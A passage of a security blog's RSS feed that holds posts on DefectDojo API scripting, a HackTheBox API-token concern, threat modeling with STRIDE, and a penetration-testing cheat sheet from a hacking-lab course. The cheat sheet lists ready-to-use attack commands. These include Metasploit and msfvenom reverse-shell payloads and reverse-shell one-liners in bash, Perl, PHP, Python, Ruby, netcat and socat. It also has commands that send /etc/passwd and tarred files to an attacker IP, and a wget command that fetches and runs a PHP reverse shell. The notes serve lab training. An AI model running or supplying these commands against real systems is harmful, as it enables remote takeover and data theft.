&lt;h3 id=&quot;examples&quot;&gt;Examples&lt;/h3&gt;

&lt;p&gt;In the next def is sent the data as HTTP GET or HTTP POST depending on the operation needed to be executed:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def fetch_data(DefectDojoURL, headersapi, dataApi, upload):

    if dataApi or upload:
        r = requests.post(DefectDojoURL, headers = headersapi, data = dataApi, verify=False)
    else:
        r = requests.get(DefectDojoURL, headers = headersapi, verify=False)

    if not (r.status_code == 200 or r.status_code == 201):
        logging.error(&apos;Error in operation&apos;)
        return False

    results = json.loads(r.text)
   
    if results:
        try:
            return results[&apos;results&apos;]
        except KeyError as error:
            return results
    else:
        logging.error(&apos;Error in operation&apos;)
        return None
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The next def is an example in which can be retrieved all the products in our DefectDojo:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def GetProducts(DefectDojoURL, apiKey):

    url = DefectDojoURL + &quot;/api/v2/products/&quot;
    dataApi = None
    headers = {&apos;Authorization&apos;:apiKey}
    data = []
    n = 0

    jsondata = fetch_data(url, headers, dataApi, false)

    if jsondata:
        for results in jsondata:
            n += 1
            product_url = results[&apos;url&apos;].split(&quot;/&quot;)
            id_product = product_url[len(product_url)-2]

            data.append([n, id_product, results[&apos;name&apos;], results[&apos;url&apos;], results[&apos;findings_count&apos;], results[&apos;prod_type&apos;], results[&apos;description&apos;], results[&apos;platform&apos;], results[&apos;lifecycle&apos;], results[&apos;origin&apos;]])

        print((colored(tabulate(data, tablefmt=&quot;fancy_grid&quot;, headers=[&quot;#&quot;, &quot;ID Product&quot;, &quot;Name&quot;, &quot;URL&quot;, &quot;Findings&quot;, &quot;Product Type&quot;, &quot;Description&quot;, &quot;Platform&quot;, &quot;Lifecycle&quot;, &quot;Origin&quot;]), &apos;green&apos;)))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The next def is an example in which can be upladed report scans for the tools integrated in DefectDojo:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def UploadScan(DefectDojoURL, apiKey, engegementID, PathFile, scan_type, scan_date):

    url = DefectDojoURL + &quot;/api/v2/import-scan/&quot;

    headers = {&apos;Authorization&apos;:apiKey}
    data = []
    n = 0

    engagement_id = &apos;/api/v2/engagements/&apos; + engegementID + &apos;/&apos;
    active = &apos;true&apos;
    tags = &apos;test&apos;
    build = &apos;test&apos;
    minimum_severity = &apos;Info&apos;
    lead = &apos;http://X.X.X.X:8888/api/v2/users/1/?id=1&apos;

    dataV2 = {
      &apos;engagement&apos;: (&apos;&apos;, engagement_id),
      &apos;verified&apos;: (&apos;&apos;, active),
      &apos;lead&apos;: (&apos;&apos;, lead),
      &apos;tags&apos;: (&apos;&apos;, tags),
      &apos;scan_date&apos;: (&apos;&apos;, scan_date),
      &apos;scan_type&apos;: (&apos;&apos;, scan_type),
      &apos;minimum_severity&apos;: (&apos;&apos;, minimum_severity),
      &apos;file&apos;: open(PathFile, &apos;rb&apos;),
      &apos;active&apos;: (&apos;&apos;, active)
    }

    jsondata = fetch_data(url, headers, dataV2, true)

    if jsondata:
        n += 1
        data.append([n, jsondata[&apos;active&apos;], jsondata[&apos;engagement&apos;], jsondata[&apos;lead&apos;], jsondata[&apos;minimum_severity&apos;], jsondata[&apos;scan_date&apos;], jsondata[&apos;scan_type&apos;], jsondata[&apos;verified&apos;]])

        print((colored(tabulate(data, tablefmt=&quot;fancy_grid&quot;, headers=[&quot;#&quot;, &quot;Active&quot;, &quot;Engagement&quot;, &quot;Lead&quot;, &quot;Minimum severity&quot;, &quot;Scan Date&quot;, &quot;Scan Type&quot;, &quot;Verified&quot;]), &apos;green&apos;)))

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Sat, 15 Dec 2018 00:00:00 +0000</pubDate>
        <link>https://1modm.github.io/DefectDojo.html</link>
        <guid isPermaLink="true">https://1modm.github.io/DefectDojo.html</guid>
        
        
      </item>
    
      <item>
        <title>API authentication considerations</title>
        <description>&lt;p&gt;Recently I was learning with hackthebox machines, and I noticed that the reset machine functionality provided by the web application was a call to an API. So the authentication was different than in the Web application. I reported the issue but they told me that they are actually aware of this already and are working on implementing rolling API keys. This has nothing to do with session/cookie data, as API keys grant access only to the API, while other website functionality is still restricted.&lt;/p&gt;

&lt;p&gt;From my point of view this is an issue because this functionality is provided under the web application and not by an external API isolated service (is just one HTTP POST call), so is somebody is able to get my token could play every day reseting machines with something as simple as this HTTP POST:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -i -s -k -X $&apos;POST&apos; $&apos;https://www.hackthebox.eu/api/vm/reset/133?api_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is just my thoughts about APIs, called WebAPIs, and the authentication applied to this type of HTTP services, should have more authentication mechanism? In my opinion yes, not just a token string, like other user identification id, expiry date, session expiration, operation id, link the token with the user cookie or session, etc.&lt;/p&gt;
</description>
        <pubDate>Sun, 29 Jul 2018 00:00:00 +0100</pubDate>
        <link>https://1modm.github.io/hackthebox-api.html</link>
        <guid isPermaLink="true">https://1modm.github.io/hackthebox-api.html</guid>
        
        
      </item>
    
      <item>
        <title>Application Threat Modeling</title>
        <description>&lt;p&gt;Threat modeling is a process by which potential threats, such as structural vulnerabilities can be identified, enumerated, and prioritized. The purpose of threat modeling is to identify, communicate, and understand threats and mitigations within the context of protecting something of value.&lt;/p&gt;

&lt;p&gt;The approach involves creating a diagram, identifying threats, mitigating them and validating each mitigation. Here’s a diagram that highlights this process:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://docs.microsoft.com/en-us/azure/security/media/azure-security-threat-modeling-tool-feature-overview/sdlapproach.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;diagram-elements&quot;&gt;Diagram Elements&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;public/images/AcbTZC0.png&quot; alt=&quot;AcbTZC0&quot; title=&quot;AcbTZC0&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;starting-the-threat-modeling-process&quot;&gt;Starting the threat modeling process&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Add trust boundaries that intersect data flows&lt;/li&gt;
  &lt;li&gt;Points/surfaces where an attacker can interject
    &lt;ul&gt;
      &lt;li&gt;Machine boundaries, privilege boundaries, integrity boundaries are examples of trust boundaries&lt;/li&gt;
      &lt;li&gt;Threads in a native process are often inside a trust boundary, because they share the same privs, rights, identifiers and access&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Processes talking across a network always have a trust boundary&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Iterate over processes, data stores, and see where they need to be broken down&lt;/li&gt;
  &lt;li&gt;Add details
    &lt;ul&gt;
      &lt;li&gt;More detail is needed to explain security impact of the design&lt;/li&gt;
      &lt;li&gt;Object crosses a trust boundary&lt;/li&gt;
      &lt;li&gt;Check and add combinations of things that can be broken out&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;diagram-layers&quot;&gt;Diagram layers&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Context Diagram
    &lt;ul&gt;
      &lt;li&gt;Very high-level; entire component / product / system&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Level 1 Diagram
    &lt;ul&gt;
      &lt;li&gt;High level; single feature / scenario&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Level 2 Diagram
    &lt;ul&gt;
      &lt;li&gt;Low level; detailed sub-components of features&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Level 3 Diagram
    &lt;ul&gt;
      &lt;li&gt;More detailed&lt;/li&gt;
      &lt;li&gt;Rare to need more layers, except in huge projects or when you’re drawing more trust boundaries&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;the-stride-threat-model&quot;&gt;The STRIDE Threat Model&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/commerce-server/ee823878(v=cs.20)&quot;&gt;https://docs.microsoft.com/en-us/previous-versions/commerce-server/ee823878(v=cs.20)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;When you are considering threats, it is useful to ask questions such as these:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;How can an attacker change the authentication data?&lt;/li&gt;
  &lt;li&gt;What is the impact if an attacker can read the user profile data?&lt;/li&gt;
  &lt;li&gt;What happens if access is denied to the user profile database?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can group threats into categories to help you formulate these kinds of pointed questions. One model you may find useful is STRIDE, derived from an acronym for the following six threat categories:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Spoofing identity. An example of identity spoofing is illegally accessing and then using another user’s authentication information, such as username and password.&lt;/li&gt;
  &lt;li&gt;Tampering with data. Data tampering involves the malicious modification of data. Examples include unauthorized changes made to persistent data, such as that held in a database, and the alteration of data as it flows between two computers over an open network, such as the Internet.&lt;/li&gt;
  &lt;li&gt;Repudiation. Repudiation threats are associated with users who deny performing an action without other parties having any way to prove otherwise—for example, a user performs an illegal operation in a system that lacks the ability to trace the prohibited operations. Nonrepudiation refers to the ability of a system to counter repudiation threats. For example, a user who purchases an item might have to sign for the item upon receipt. The vendor can then use the signed receipt as evidence that the user did receive the package.&lt;/li&gt;
  &lt;li&gt;Information disclosure. Information disclosure threats involve the exposure of information to individuals who are not supposed to have access to it—for example, the ability of users to read a file that they were not granted access to, or the ability of an intruder to read data in transit between two computers.&lt;/li&gt;
  &lt;li&gt;Denial of service. Denial of service (DoS) attacks deny service to valid users—for example, by making a Web server temporarily unavailable or unusable. You must protect against certain types of DoS threats simply to improve system availability and reliability.&lt;/li&gt;
  &lt;li&gt;Elevation of privilege. In this type of threat, an unprivileged user gains privileged access and thereby has sufficient access to compromise or destroy the entire system. Elevation of privilege threats include those situations in which an attacker has effectively penetrated all system defenses and become part of the trusted system itself, a dangerous situation indeed.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tools&quot;&gt;Tools&lt;/h2&gt;
&lt;p&gt;I bring two tools that can be used to define and identify the attack vector in an specific scenario, platform or environment.&lt;/p&gt;

&lt;h3 id=&quot;microsoft-threat-modeling-tool-2016&quot;&gt;Microsoft Threat Modeling Tool 2016&lt;/h3&gt;

&lt;p&gt;Microsoft Threat Modeling Tool 2016 is a tool that helps in finding threats in the design phase of software projects. It’s available as a free download from the Microsoft Download Center. This latest release simplifies working with threats and provides a new editor for defining your own threats. Microsoft Threat Modeling Tool 2016 has several improvements such as New Threat Grid, Template Editor &amp;amp; Migrating Existing Data Flow Diagrams.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/en-us/download/details.aspx?id=49168&quot;&gt;https://www.microsoft.com/en-us/download/details.aspx?id=49168&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://docs.microsoft.com/en-us/azure/security/media/azure-security-threat-modeling-tool-feature-overview/basictmt.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;owasp-threat-dragon&quot;&gt;OWASP Threat Dragon&lt;/h3&gt;

&lt;p&gt;An online threat modelling web application including system diagramming and a rule engine to auto-generate threats/mitigations. The focus will be on great UX a powerful rule engine and alignment with other development lifecycle tools.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/OWASP_Threat_Dragon&quot;&gt;https://www.owasp.org/index.php/OWASP_Threat_Dragon&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/mike-goodwin/owasp-threat-dragon&quot;&gt;https://github.com/mike-goodwin/owasp-threat-dragon&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/C-SuPJuUMAAg2DL.jpg&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ent&quot;&gt;Ent&lt;/h3&gt;

&lt;p&gt;An attack tree generator built on electron&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/jimmythompson/ent&quot;&gt;https://github.com/jimmythompson/ent&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;seamonster&quot;&gt;Seamonster&lt;/h3&gt;

&lt;p&gt;SeaMonster is a security modeling tool for threat models. It supports notations that security experts and analyzers are already familiar with, namely attack trees and misuse cases, and can connect to a repository for model sharing and reuse.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://sourceforge.net/projects/seamonster&quot;&gt;https://sourceforge.net/projects/seamonster&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sat, 23 Jun 2018 00:00:00 +0100</pubDate>
        <link>https://1modm.github.io/threatmodel.html</link>
        <guid isPermaLink="true">https://1modm.github.io/threatmodel.html</guid>
        
        
      </item>
    
      <item>
        <title>Virtual Hacking Labs Notes</title>
        <description>&lt;p&gt;Recently I tried and passed (Certificate ID: 1837845437) the course Penetration Testing Course by Virtual Hacking Labs in which you need to complete at least 20 lab machines successfully in their virtual environment. &lt;a href=&quot;https://www.virtualhackinglabs.com/reviews/&quot;&gt;Reviews&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The environment is very easy to use, using a VM with parrot or kali to complete/exploit as much servers as possible, nice and good documentation and guides. Totally recommended, if you want to learn doing something more than read.&lt;/p&gt;

&lt;h3 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;﻿nslookup -type=any &amp;lt;DOMAIN&amp;gt;
host -t axfr -l &amp;lt;DOMAIN&amp;gt; &amp;lt;DNSSERVER&amp;gt;
dig -t mx &amp;lt;DOMAIN&amp;gt;
dig -t any &amp;lt;DOMAIN&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Service discovery
nmap -sV &amp;lt;IP&amp;gt;
nmap -sV -O &amp;lt;IP&amp;gt;
nmap -p 1-65535 -T4 -A -v -Pn &amp;lt;IP&amp;gt;

# Host discovery
nmap -sn &amp;lt;NETWORK&amp;gt;

# TCP connect scan
nmap -sT &amp;lt;IP&amp;gt;

# TCP SYN scan
nmap -sS &amp;lt;IP&amp;gt;

# TCP ACK scan
nmap -sA &amp;lt;IP&amp;gt;

# TCP Window scan
nmap -sW &amp;lt;IP&amp;gt;

# TCP Maimon scan
nmap -sM &amp;lt;IP&amp;gt;

## TCP Null Scan to fool a firewall to generate a response
## Does not set any bits (TCP flag header is 0)
nmap -sN &amp;lt;IP&amp;gt;
 
## TCP Fin scan to check firewall
## Sets just the TCP FIN bit
nmap -sF &amp;lt;IP&amp;gt;
 
## TCP Xmas scan to check firewall
## Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree
nmap -sX &amp;lt;IP&amp;gt;

# UDP port scanning
nmap -sU &amp;lt;IP&amp;gt;
nmap -sU -sS -p U:137-139,T:137-139,445 &amp;lt;IP&amp;gt;

# Aggressive scan
nmap -A &amp;lt;IP&amp;gt;

# Read the list of targets using a text file
nmap -iL IPs.txt

# Excluding hosts/networks
nmap &amp;lt;NETWORK&amp;gt; --exclude &amp;lt;IP&amp;gt; &amp;lt;IP&amp;gt;

# Scripting
nmap -p 139,445 --script=smb-vuln* &amp;lt;IP&amp;gt;
nmap -sV --script http-wordpress-enum --script-args limit=25 &amp;lt;IP&amp;gt;
nmap --script ftp-vsftpd-backdoor –p 21 &amp;lt;IP&amp;gt;
nmap -sV -script irc-unrealircd-backdoor -p 6667 &amp;lt;IP&amp;gt;

# Show all packets sent and received
nmap --packet-trace -p 22 &amp;lt;IP&amp;gt;

# Show host interfaces and routes
nmap --iflist

# Scan IPv6
nmap -6 &amp;lt;IPv6&amp;gt;
nmap -v A -6 &amp;lt;IPv6&amp;gt;

# Save output
nmap -oN &amp;lt;FILE&amp;gt; &amp;lt;IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;MyIP&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -qO- http://ipecho.net/plain; echo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;SMB&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L &amp;lt;IP&amp;gt;
rpcclient -U &quot;&quot; &amp;lt;IP&amp;gt;
smbclient -U &amp;lt;HOST&amp;gt; -L &amp;lt;IP&amp;gt;
/usr/bin/smbclient \\\\&amp;lt;IP&amp;gt;\\share &amp;lt;HOST&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/&quot;&gt;Exploit DB&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Search Exploits&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nikto -h &amp;lt;http://IP&amp;gt;
searchsploit
sudo wpscan --url &amp;lt;IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Listener&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Windows&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/multi/handler 
msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_tcp
payload =&amp;gt; windows/meterpreter/reverse_tcp 
msf exploit(handler) &amp;gt; set LHOST &amp;lt;IP&amp;gt; 
lhost =&amp;gt; &amp;lt;IP&amp;gt;
msf exploit(handler) &amp;gt; set LPORT 4444 
lport =&amp;gt; 4444 
msf exploit(handler) &amp;gt; run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Linux&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf payload(linux/x86/meterpreter/reverse_tcp) &amp;gt; use exploit/multi/handler 
msf exploit(multi/handler) &amp;gt; set payload linux/x86/meterpreter/reverse_tcp 
payload =&amp;gt; linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) &amp;gt; set LHOST &amp;lt;IP&amp;gt;
LHOST =&amp;gt; &amp;lt;IP&amp;gt;
msf exploit(multi/handler) &amp;gt; run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;msfvenom&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -e x86/shikata_ga_nai -b &apos;\x00\x0a\x0d\x26&apos; -f python --smallest
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -f war &amp;gt; shell.war
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -f elf &amp;gt; shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;Linux privilege escalation notes&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/&quot;&gt;Windows privilege escalation notes&lt;/a&gt;
&lt;a href=&quot;http://toshellandback.com/2015/11/24/ms-priv-esc/&quot;&gt;Common Windows Privilege Escalation Vectors&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Check port&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;lsof +c 0 -i:40001 -n&lt;/p&gt;

&lt;h3 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Upgrade shell&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;);&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Listener&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Bash
bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/4444 0&amp;gt;&amp;amp;1

# Perl
perl -e &apos;use Socket;$i=&quot;&amp;lt;IP&amp;gt;&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;

# PHP
php -r &apos;$sock=fsockopen(&quot;&amp;lt;IP&amp;gt;&quot;,4444);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);&apos;

# Python
python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;IP&amp;gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;

# Ruby
ruby -rsocket -e&apos;f=TCPSocket.open(&quot;&amp;lt;IP&amp;gt;&quot;,80).to_i;exec sprintf(&quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&quot;,f,f,f)&apos;

# Netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;IP&amp;gt; 4444 &amp;gt;/tmp/f
nc -e /bin/sh &amp;lt;IP&amp;gt; 444

# sh
0&amp;lt;&amp;amp;196; exec 196&amp;lt;&amp;gt;/dev/tcp/&amp;lt;IP&amp;gt;/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196

# Socat
socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:&amp;lt;IP&amp;gt;:4444 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;bind-shell&quot;&gt;Bind Shell&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Target&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Windows
nc -lvp 4444 -e cmd.exe

# Linux
nc -lvp 4444 -e /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &amp;lt;IP&amp;gt; 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;sending-files&quot;&gt;Sending files&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec 3&amp;lt;&amp;gt;/dev/tcp/&amp;lt;IP&amp;gt;/4444 &amp;amp;&amp;amp; cat /etc/passwd&amp;gt;&amp;amp;3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;With Netcat&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Listener:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 &amp;gt; received_file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Target:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat &amp;lt;IP&amp;gt; 4444 &amp;lt; original_file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Listener:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 | tar xzvf -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Target:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tar -czf - * | netcat &amp;lt;IP&amp;gt; 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;file-upload-in-windows-with-powershell&quot;&gt;File upload in Windows with PowerShell&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/&quot;&gt;[Windows / DOS / PowerShell] File upload in command line&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;php-web-and-reverse-shells&quot;&gt;PHP web and reverse shells&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/JohnTroony/php-webshells&quot;&gt;php-webshells&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;amp;&amp;amp; php -f /tmp/php_shell.php
